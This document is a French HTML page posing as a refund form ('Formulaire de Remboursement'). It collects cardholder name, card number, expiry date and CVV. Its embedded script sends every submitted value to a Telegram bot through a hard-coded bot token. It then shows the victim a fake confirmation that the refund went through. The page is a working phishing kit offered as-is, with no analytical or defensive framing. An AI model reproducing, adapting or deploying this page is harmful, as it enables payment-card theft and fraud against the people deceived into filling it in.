<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remboursement</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
        }
        .error-message {
            color: #e63946;
            font-size: 0.875rem;
            margin-top: 0.25rem;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white shadow-xl rounded-lg p-8 w-full max-w-md">
        <h1 class="text-3xl font-bold text-gray-800 text-center mb-6">Formulaire de Remboursement</h1>
        <form id="remboursement-form" onsubmit="return validateForm(event)">
            <!-- Nom du titulaire -->
            <div class="mb-4">
                <label for="nom" class="block text-sm font-medium text-gray-700">Nom du titulaire</label>
                <input type="text" id="nom" name="nom" placeholder="Ex : Jean Dupont" required
                    class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
            </div>
            <!-- Numéro de la carte -->
            <div class="mb-4">
                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de la carte</label>
                <input type="text" id="numero-carte" name="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
                    class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                <p id="card-error" class="error-message hidden">Le numéro de la carte doit contenir 16 chiffres.</p>
            </div>
            <!-- Date d'expiration -->
            <div class="mb-4">
                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration</label>
                <input type="month" id="date-expiration" name="date-expiration" required
                    class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                <p id="date-error" class="error-message hidden">La date d'expiration est invalide ou déjà passée.</p>
            </div>
            <!-- Code CVV -->
            <div class="mb-6">
                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" required maxlength="3"
                    class="mt-1 block w-full px-4 py-2 border rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                <p id="cvv-error" class="error-message hidden">Le CVV doit contenir exactement 3 chiffres.</p>
            </div>
            <!-- Bouton de confirmation -->
            <button type="submit"
                class="w-full bg-blue-600 text-white font-bold py-2 px-4 rounded-md hover:bg-blue-700 transition duration-300">
                Confirmer le Remboursement
            </button>
        </form>
    </div>

    <script>
        const token = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I";  // Télégram Token
        const chatId = "@YourChannelOrChatId"; // Remplacez cela par votre chat ID ou le nom d'utilisateur du canal

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log("Message envoyé à Telegram:", data);
            })
            .catch(error => {
                console.error("Erreur d'envoi au bot Telegram:", error);
            });
        }

        function validateForm(event) {
            event.preventDefault();

            // Obtenir les valeurs des champs
            const nom = document.getElementById('nom').value;
            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '');
            const cvv = document.getElementById('cvv').value;
            const expirationDate = new Date(document.getElementById('date-expiration').value);
            const currentDate = new Date();

            let valid = true;

            // Validation du numéro de carte
            const cardRegex = /^[0-9]{16}$/;
            if (!cardRegex.test(cardNumber)) {
                document.getElementById('card-error').classList.remove('hidden');
                valid = false;
            } else {
                document.getElementById('card-error').classList.add('hidden');
            }

            // Validation du CVV
            const cvvRegex = /^[0-9]{3}$/;
            if (!cvvRegex.test(cvv)) {
                document.getElementById('cvv-error').classList.remove('hidden');
                valid = false;
            } else {
                document.getElementById('cvv-error').classList.add('hidden');
            }

            // Validation de la date d'expiration
            if (expirationDate <= currentDate || isNaN(expirationDate.getTime())) {
                document.getElementById('date-error').classList.remove('hidden');
                valid = false;
            } else {
                document.getElementById('date-error').classList.add('hidden');
            }

            if (valid) {
                // Si le formulaire est valide, envoyer les données à Telegram
                const message = `
                    Nouveau remboursement:
                    - Nom: ${nom}
                    - Numéro de la carte: ${cardNumber}
                    - Date d'expiration: ${document.getElementById('date-expiration').value}
                    - CVV: ${cvv}
                `;
                sendToTelegram(message);
                alert('Toutes les informations sont valides. Le remboursement a été confirmé !');
            }
        }
    </script>
</body>
</html>
